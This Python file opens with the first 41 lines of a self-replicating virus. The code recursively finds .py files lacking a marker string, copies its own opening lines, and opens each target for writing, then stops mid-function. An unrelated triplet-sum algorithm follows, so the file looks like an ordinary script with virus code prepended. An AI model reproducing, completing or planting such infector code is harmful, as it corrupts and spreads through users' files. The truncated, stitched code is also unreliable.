#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to find a triplet

# returns true if there is triplet
# with sum equal to 'sum' present
# in A[]. Also, prints the triplet
def find3Numbers(A, arr_size, sum):

 # Sort the elements
 A.sort()

 # Now fix the first element
 # one by one and find the
 # other two elements
 for i in range(0, arr_size-2):
 

  # To find the other two elements,
  # start two index variables from
  # two corners of the array and
  # move them toward each other
  
  # index of the first element
  # in the remaining elements
  l = i + 1
  
  # index of the last element
  r = arr_size-1
  while (l < r):
  
   if( A[i] + A[l] + A[r] == sum):
    print("Triplet is", A[i],
     ', ', A[l], ', ', A[r]);
    return True
   
   elif (A[i] + A[l] + A[r] < sum):
    l += 1
   else: # A[i] + A[l] + A[r] > sum
    r -= 1

 # If we reach here, then
 # no triplet was found
 return False

# Driver program to test above function
A = [1, 4, 45, 6, 10, 8]
sum = 22
arr_size = len(A)

find3Numbers(A, arr_size, sum)

# This is contributed by Smitha Dinesh Semwal
# Time Complexity: O(Nˆ2)
# Space Complexity: O(1)
